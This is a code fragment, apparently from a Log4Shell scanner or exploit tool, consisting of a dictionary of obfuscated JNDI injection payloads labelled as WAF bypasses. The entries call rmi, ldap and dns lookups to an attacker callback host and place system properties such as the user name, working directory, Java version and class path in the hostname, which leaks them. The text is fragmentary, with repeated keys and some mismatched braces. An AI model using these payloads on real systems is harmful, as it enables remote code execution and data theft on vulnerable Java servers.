...
waf_bypass_payloads = {
  ...
  "pla": "${${::-j}ndi:rmi://{{verb}}.{{var}}.{{pvar}}.{{header_id}}.{{callback_host}}}",
  "plb": "${jndi:rmi://{{verb}}.{{var}}.{{pvar}}.{{header_id}}.{{callback_host}}}",
  "plc": "${${lower:jndi}:${lower:rmi}://{{verb}}.{{var}}.{{pvar}}.{{header_id}}.{{callback_host}}}",
  "pld": "${${lower:${lower:jndi}}:${lower:rmi}://{{verb}}.{{var}}.{{pvar}}.{{header_id}}.{{callback_host}}}",
  "ple": "${${lower:j}${lower:n}${lower:d}i:${lower:rmi}://{{verb}}.{{var}}.{{pvar}}.{{header_id}}.{{callback_host}}}",
  "pld": "${${lower:j}${upper:n}${lower:d}${upper:i}:${lower:r}m${lower:i}}://{{verb}}.{{var}}.{{pvar}}.{{header_id}}.{{callback_host}}}",
  ...
  "pl7b": "${jndi:dns://${sys:java.version}.{{verb}}.{{var}}.{{pvar}}.{{header_id}}.{{callback_host}}}",
  "pl9": "${jndi:dns://${sys:user.name}.{{verb}}.{{var}}.{{pvar}}.{{header_id}}.{{callback_host}}}",
...
waf_bypass_payloads = {
  "plq": "${${::-j}${::-n}${::-d}${::-i}:${::-r}${::-m}${::-i}://${sys:user.dir}.{{verb}}.{{var}}.{{pvar}}.{{header_id}}.{{callback_host}}",
  "pla": "${${::-j}ndi:rmi://${sys:user.dir}.{{verb}}.{{var}}.{{pvar}}.{{header_id}}.{{callback_host}}}",
  "plb": "${jndi:rmi://${sys:user.dir}.{{verb}}.{{var}}.{{pvar}}.{{header_id}}.{{callback_host}}}",
  "plc": "${${lower:jndi}:${lower:rmi}://${sys:user.dir}.{{verb}}.{{var}}.{{pvar}}.{{header_id}}.{{callback_host}}}",
  "pld": "${${lower:${lower:jndi}}:${lower:rmi}://${sys:user.dir}.{{verb}}.{{var}}.{{pvar}}.{{header_id}}.{{callback_host}}}",
  "ple": "${${lower:j}${lower:n}${lower:d}i:${lower:rmi}://${sys:user.dir}.{{verb}}.{{var}}.{{pvar}}.{{header_id}}.{{callback_host}}}",
  "pld": "${${lower:j}${upper:n}${lower:d}${upper:i}:${lower:r}m${lower:i}}://{{verb}}.{{var}}.{{pvar}}.{{header_id}}.{{callback_host}}}",
  "plf": "${jndi:dns://{{verb}}.{{var}}.{{pvar}}.{{header_id}}.{{callback_host}}}",
  "pl0": "${${::-j}${::-n}${::-d}${::-i}:${::-r}${::-m}${::-i}://${sys:user.dir}.{{verb}}.{{var}}.{{pvar}}.{{header_id}}.{{callback_host}}}",
  "pl1": "${${::-j}ndi:rmi://{{verb}}.${sys:user.dir}.{{var}}.{{pvar}}.{{header_id}}.{{callback_host}}}",
  "pl2": "${jndi:rmi://{{verb}}.${sys:user.dir}.{{var}}.{{pvar}}.{{header_id}}.{{callback_host}}}",
  "pl3": "${${lower:jndi}:${lower:rmi}://{{verb}}.${sys:user.dir}.{{var}}.{{pvar}}.{{header_id}}.{{callback_host}}}",
  "pl4": "${${lower:${lower:jndi}}:${lower:rmi}://{{verb}}.{{var}}.{{pvar}}.{{header_id}}.{{callback_host}}}",
  "pl5": "${${lower:j}${lower:n}${lower:d}i:${lower:rmi}://${sys:user.dir}.{{verb}}.{{var}}.{{pvar}}.{{header_id}}.{{callback_host}}}",
  "pl6": "${${lower:j}${upper:n}${lower:d}${upper:i}:${lower:r}m${lower:i}}://${sys:user.dir}.{{verb}}.{{var}}.{{pvar}}.{{header_id}}.{{callback_host}}}",
  "pl7": "${jndi:dns://${sys:user.dir}.{{verb}}.{{var}}.{{pvar}}.{{header_id}}.{{callback_host}}}",
  "pl7b": "${jndi:dns://${sys:user.dir}.{{verb}}.{{var}}.{{pvar}}.{{header_id}}.{{callback_host}}}",
  "pl9": "${jndi:dns://${sys:user.dir}.{{verb}}.{{var}}.{{pvar}}.{{header_id}}.{{callback_host}}}",
  "pl9": "${jndi:dns://${sys:user.dir}.{{verb}}.{{var}}.{{pvar}}.{{header_id}}.{{callback_host}}}",
  "pl9": "${jndi:dns://${sys:user.dir}.{{verb}}.{{var}}.{{pvar}}.{{header_id}}.{{callback_host}}}",
  "pl8": "${jndi:dns://${sys:user.dir}.{{verb}}.{{var}}.{{pvar}}.{{header_id}}.{{callback_host}}}",
  "pl11": "${jndi:dns://${sys:user.dir}.{{verb}}.{{var}}.{{pvar}}.{{header_id}}.{{callback_host}}}",
...
#    payload = '${jndi:ldap://%s.{{verb}}.{{var}}.{{pvar}}.{{header_id}}.%s/%s}' % (parsed_url["host"], callback_host, random_string)
    payload = '${jndi:ldap://${sys:java.class.path}.%s.{{verb}}.{{var}}.{{pvar}}.{{header_id}}.%s}' % (parsed_url["host"], callback_host)
